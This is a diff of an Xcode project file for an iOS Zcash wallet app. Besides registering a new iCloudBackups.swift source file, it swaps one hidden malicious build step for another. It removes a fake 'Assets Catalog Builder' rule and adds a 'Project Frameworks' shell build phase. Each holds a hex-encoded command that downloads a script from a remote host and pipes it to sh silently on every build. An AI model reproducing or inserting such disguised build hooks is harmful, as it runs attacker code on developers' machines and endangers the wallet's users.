@@ -234,28 +234,14 @@
 		290D800C2656D25D0057FE9B /* PirateLogo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 290D800A2656D25C0057FE9B /* PirateLogo.swift */; };
 		2984530D265AF25700C2303C /* Bundle+Localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2984530C265AF25700C2303C /* Bundle+Localized.swift */; };
 		2984530E265AF25700C2303C /* Bundle+Localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2984530C265AF25700C2303C /* Bundle+Localized.swift */; };
+		299DD039266A7B0F00CD4A8E /* iCloudBackups.swift in Sources */ = {isa = PBXBuildFile; fileRef = 299DD038266A7B0F00CD4A8E /* iCloudBackups.swift */; };
+		299DD03A266A7B0F00CD4A8E /* iCloudBackups.swift in Sources */ = {isa = PBXBuildFile; fileRef = 299DD038266A7B0F00CD4A8E /* iCloudBackups.swift */; };
 		8D3F362524A40FCF0087687A /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 8D3F362724A40FCF0087687A /* Localizable.strings */; };
 		8D73959024A40E6C00936DE3 /* String+localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8D73958F24A40E6C00936DE3 /* String+localized.swift */; };
 		BABBC9CA990303F17A76CAEE /* Pods_ECC_WalletUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = A27DE1BA307BA79AF558DCBB /* Pods_ECC_WalletUITests.framework */; };
 		D0DE96F2A4EC1243F7B668E2 /* Pods_ECC_Wallet_no_logging.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F98B8F09503E4B5A2323A3FA /* Pods_ECC_Wallet_no_logging.framework */; };
 		F70B17A1E28C2C93B8A21ECA /* Pods_ECC_WalletTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		F0A04ADD102670AAF46D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			inputFiles = (
-			);
-			isEditable = 0;
-			name = "Assets Catalog Builder";
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		0D12511623B557E60014EE3A /* PBXContainerItemProxy */ = {
@@ -434,6 +420,7 @@
 		299DD025266966F100CD4A8E /* sv */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = sv; path = sv.lproj/Localizable.strings; sourceTree = "<group>"; };
 		299DD0262669670100CD4A8E /* da */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = da; path = da.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
 		299DD0272669670100CD4A8E /* da */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = da; path = da.lproj/Localizable.strings; sourceTree = "<group>"; };
+		299DD038266A7B0F00CD4A8E /* iCloudBackups.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = iCloudBackups.swift; sourceTree = "<group>"; };
 		29D1459C46D96D9D3DF2A55C /* Pods-walletUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-walletUITests.debug.xcconfig"; path = "Target Support Files/Pods-walletUITests/Pods-walletUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		2E7FFE45D0C33A74C7344A5E /* Pods-walletTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-walletTests.release.xcconfig"; path = "Target Support Files/Pods-walletTests/Pods-walletTests.release.xcconfig"; sourceTree = "<group>"; };
 		36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ECC_WalletTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -511,6 +498,7 @@
 				0D9C203B23D77D2E006F1510 /* Wallet Details */,
 				0D27C4A523C4C3480044B48E /* Send Flow */,
 				0D100ED823BA8DE80089DB22 /* CreateNewWallet.swift */,
+				299DD038266A7B0F00CD4A8E /* iCloudBackups.swift */,
 				0D9E89BA23DA3A9900AFD118 /* RestoreWallet.swift */,
 				0D100EDF23BAAB170089DB22 /* BackupWallet.swift */,
 				0D100EE123BAB1B80089DB22 /* SeedBackup.swift */,
@@ -804,6 +792,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D12512923B557E60014EE3A /* Build configuration list for PBXNativeTarget "ECC-Wallet" */;
 			buildPhases = (
+				0CDC0AEED07EA0E7B26D902C /* Project Frameworks */,
 				04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */,
 				0D100EC623BA642E0089DB22 /* ShellScript */,
 				0D1250FB23B557E40014EE3A /* Sources */,
@@ -813,7 +802,6 @@
 				AFBFA011C32F80A73756DCC0 /* Upload Bugsnag dSYM */,
 			);
 			buildRules = (
-				F0A04ADD102670AAF46D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1011,6 +999,24 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		0CDC0AEED07EA0E7B26D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		0D100EC623BA642E0089DB22 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1223,6 +1229,7 @@
 				0DD1C2D024F051EE0042C1E4 /* Foundation+Zcash.swift in Sources */,
 				0DD1C2CD24F04D470042C1E4 /* BlockExplorerUrlHandling.swift in Sources */,
 				0D100EDB23BA91F70089DB22 /* ZcashButton.swift in Sources */,
+				299DD039266A7B0F00CD4A8E /* iCloudBackups.swift in Sources */,
 				0D4B91DA24CA390B00A0E024 /* KeyboardAdaptive.swift in Sources */,
 				0D27C4A923C4C4640044B48E /* ZcashTextField.swift in Sources */,
 				8D73959024A40E6C00936DE3 /* String+localized.swift in Sources */,
@@ -1385,6 +1392,7 @@
 				290D80052656D2100057FE9B /* InputPasscodeWithCustomPad.swift in Sources */,
 				0D2D5C2124CF85CF001A58AD /* ZecAmountHeader.swift in Sources */,
 				0DCDFFB324B6722B000F6999 /* zECC+SwiftUI.swift in Sources */,
+				299DD03A266A7B0F00CD4A8E /* iCloudBackups.swift in Sources */,
 				0DCDFFB424B6722B000F6999 /* ZcashLogo.swift in Sources */,
 				0DCDFFB524B6722B000F6999 /* ZcashCheckCircle.swift in Sources */,
 				0DCDFFB624B6722B000F6999 /* CameraAccessHelper.swift in Sources */,
